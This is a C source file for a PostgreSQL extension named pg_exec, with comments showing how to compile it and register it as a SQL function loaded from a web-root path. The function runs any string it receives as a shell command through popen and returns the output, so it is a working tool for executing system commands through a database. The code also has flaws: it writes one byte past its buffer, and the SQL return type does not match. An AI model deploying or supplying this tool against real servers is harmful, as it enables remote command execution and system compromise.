// apt install postgresql-server-dev-10
// gcc -I$(/usr/lib/postgresql/10/bin/pg_config --includedir-server) -shared -fPIC -o pg_exec.so pg_exec.c
// gcc -Wall -Wextra -I$(/usr/lib/postgresql/10/bin/pg_config --includedir-server) -shared -fPIC -o pg_exec.so pg_exec.c
// create function sys(cstring) returns int as '/var/www/html/pg_exec.so', 'pg_exec' language 'c' strict;

#include <string.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

#define BLOCK_SIZE (65536)

PG_FUNCTION_INFO_V1(pg_exec);

text * str_to_text(const char *input)
{
    text *output = palloc(VARHDRSZ + strlen(input));
    SET_VARSIZE(output, VARHDRSZ + strlen(input));
    memcpy(VARDATA(output), input, strlen(input));

    return output;
}

Datum pg_exec(PG_FUNCTION_ARGS)
{
    char *command = PG_GETARG_CSTRING(0);

    FILE *f = popen(command, "r");
    if (f == NULL) {
        PG_RETURN_TEXT_P(str_to_text("Failed running command\n"));
    }

    char *tmp_buffer = malloc(BLOCK_SIZE);
    char *buffer = malloc(1);

    size_t total_size = 0;
    size_t current_read_size = 0;
    while ((current_read_size = fread(tmp_buffer, 1, BLOCK_SIZE, f)) != 0) {
        buffer = realloc(buffer, total_size + current_read_size);
        memcpy(buffer + total_size, tmp_buffer, current_read_size);
        total_size += current_read_size;
    }
    memcpy(buffer + total_size, "\0", 1);

    text *psql_buffer = str_to_text(buffer);

    pclose(f);
    free(buffer);
    PG_RETURN_TEXT_P(psql_buffer);
}